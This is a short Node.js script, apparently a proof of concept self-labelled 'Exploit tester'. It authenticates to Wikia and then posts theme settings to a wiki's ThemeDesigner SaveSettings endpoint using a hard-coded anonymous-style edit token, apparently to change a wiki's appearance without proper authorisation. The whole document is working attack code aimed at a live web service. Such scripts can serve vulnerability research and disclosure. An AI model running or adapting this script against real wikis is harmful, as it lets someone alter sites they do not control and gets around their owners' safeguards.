'use strict';
const http = require('request-promise-native'),
      config = require('./config.json'),
      jar = http.jar(),
      settings = {};

for (let i in config.settings) {
    settings[`settings[${i}]`] = config.settings[i];
}
settings.token = "16ec391682ba9edf54a6a80b7cb9c1f7+\\";

function req(url, method, qs, form) {
    return http({
        headers: {
            'User-Agent': 'Exploit tester v1.0'
        },
        uri: url,
        method: method,
        qs,
        form,
        jar
    });
}

req('https://services.wikia.com/auth/token', 'POST', undefined, {
    username: config.username,
    password: config.password
}).then(d => req(`http://${config.wiki}.wikia.com/wikia.php`, 'POST', {
    controller: 'ThemeDesigner',
    method: 'SaveSettings',
    format: 'json'
}, settings)).catch(e => console.log(e));
